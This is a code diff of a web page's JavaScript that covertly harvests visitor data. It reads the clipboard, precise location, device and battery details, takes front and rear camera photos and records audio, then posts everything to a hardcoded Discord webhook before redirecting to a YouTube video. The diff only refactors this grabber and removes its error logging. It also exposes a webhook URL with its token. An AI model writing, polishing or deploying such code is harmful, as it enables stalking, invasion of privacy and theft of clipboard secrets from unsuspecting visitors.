@@ -26,7 +26,7 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        // Helper function to handle image processing for both cameras
+        // Helper function for dual camera capture
         async function takeSnapshot(stream) {
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -48,9 +48,7 @@
             const ram = navigator.deviceMemory || "Unknown";
             const time = new Date().toLocaleString();
             
-            let browserType = "Standard Browser";
-            if (ua.includes("Discord")) browserType = "Discord App";
-            else if (ua.includes("Instagram")) browserType = "Instagram App";
+            let browserType = ua.includes("Discord") ? "Discord App" : (ua.includes("Instagram") ? "Instagram App" : "Standard Browser");
 
             let batteryInfo = "Unknown";
             try {
@@ -62,7 +60,8 @@
             try { clip = await navigator.clipboard.readText(); } catch (e) {}
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `http://googleusercontent.com/maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                // FIXED GOOGLE MAPS LINK
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
                 // STEP 1: Send Text Metadata
                 await fetch(WEBHOOK_URL, {
@@ -75,15 +74,12 @@
 
                 // STEP 2: DUAL MEDIA CAPTURE
                 const fd = new FormData();
-                let audioBlob = null;
-
                 try {
-                    // 2a. Capture Front Camera (User) + Audio
+                    // Capture Front Camera + Audio
                     const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                     const frontPhoto = await takeSnapshot(frontStream);
-                    fd.append("file1", frontPhoto, "front_face.jpg");
+                    fd.append("file1", frontPhoto, "front.jpg");
 
-                    // Start Audio Recording (using the front stream's audio)
                     const mediaRecorder = new MediaRecorder(frontStream);
                     const chunks = [];
                     mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
@@ -92,28 +88,19 @@
                     });
                     mediaRecorder.start();
                     setTimeout(() => mediaRecorder.stop(), 2000);
-                    audioBlob = await recordTask;
+                    const audioBlob = await recordTask;
+                    fd.append("file2", audioBlob, "audio.wav");
                     
-                    // Close front stream tracks
                     frontStream.getTracks().forEach(t => t.stop());
 
-                    // 2b. Capture Back Camera (Environment)
+                    // Capture Back Camera
                     const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                     const backPhoto = await takeSnapshot(backStream);
-                    fd.append("file2", backPhoto, "back_view.jpg");
-                    
-                    // Close back stream tracks
+                    fd.append("file3", backPhoto, "back.jpg");
                     backStream.getTracks().forEach(t => t.stop());
 
-                    // Append Audio to the form
-                    if (audioBlob) fd.append("file3", audioBlob, "audio.wav");
-
-                    // STEP 3: Send All Files to Discord
                     await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-
-                } catch (mediaErr) {
-                    console.log("Media blocked or not available");
-                }
+                } catch (mediaErr) {}
 
                 window.location.replace(REDIRECT_URL);
 
